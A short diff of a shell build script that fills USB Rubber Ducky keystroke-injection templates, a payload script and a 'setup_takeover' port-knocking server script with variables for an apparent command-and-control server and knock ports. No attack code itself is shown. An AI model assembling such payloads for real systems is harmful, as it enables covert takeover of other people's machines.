@@ -12,7 +12,7 @@ fi
 
 mkdir payload
 
-envsubst "\$C_SERVER \$PAYLOAD_PATH" < ducky/ducky_script.txt > payload/ducky.txt
+envsubst "\$C_SERVER \$PAYLOAD_PATH \$KNOCK_OPEN_HTTP \$KNOCK_OPEN_HTTPS" < ducky/ducky_script.txt > payload/ducky.txt
 envsubst < ducky/script.sh > payload/payload.sh
 envsubst < setup_takeover/setup_knock.bash > payload/server_payload.sh
 
